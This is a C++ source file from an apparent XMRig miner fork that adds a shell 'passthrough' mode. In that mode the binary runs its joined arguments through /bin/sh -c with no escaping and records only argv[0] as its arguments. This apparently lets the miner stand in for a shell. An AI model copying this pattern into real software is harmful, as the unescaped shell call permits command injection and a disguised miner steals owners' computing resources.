/* XMRig
 * Copyright (c) 2018-2021 SChernykh   <https://github.com/SChernykh>
 * Copyright (c) 2016-2021 XMRig       <https://github.com/xmrig>, <support@xmrig.com>
 * Copyright (c) 2024 smugg99          <https://github.com/smugg99>
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "core/Passthrough.h"

#include "App.h"
#include "base/kernel/Entry.h"
#include "base/kernel/Process.h"
#include "base/io/log/Log.h"
#include "core/Passthrough.h"

#include <iostream>
#include <fstream>
#include <cstdlib>
#include <vector>
#include <unistd.h>
#include <sys/stat.h> 
#include <string>

Passthrough::Passthrough(const std::string& filePath) : lockFilePath(filePath) {}

bool Passthrough::isAnotherInstanceRunning() {
	struct stat buffer;
	return (stat(lockFilePath.c_str(), &buffer) == 0);
}

void Passthrough::createLockFile() {
	std::ofstream lockFile(lockFilePath);
}

void Passthrough::removeLockFile() {
	std::remove(lockFilePath.c_str());
}

#   ifndef XMRIG_OS_WIN
#       ifdef XMRIG_SH_PASSTHROUGH
int Passthrough::handlePassthrough(int argc, char** argv) {
	std::string command;
	for (int i = 1; i < argc; ++i) {
		command += argv[i];
		if (i != argc - 1)
			command += " ";
	}

	return std::system(("/bin/sh -c \"" + command + "\"").c_str());
}
#   	endif
#   endif

int Passthrough::createProcess(int argc, char** argv, xmrig::Process* process) {
#   ifndef XMRIG_OS_WIN
#       ifdef XMRIG_SH_PASSTHROUGH

	char* process_argv[] = { argv[0], nullptr };
	*process = xmrig::Process(1, process_argv);
	
	return this->handlePassthrough(argc, argv);
#   endif
#       else
	*process = xmrig::Process(argc, argv);
#   endif

	return 0;
}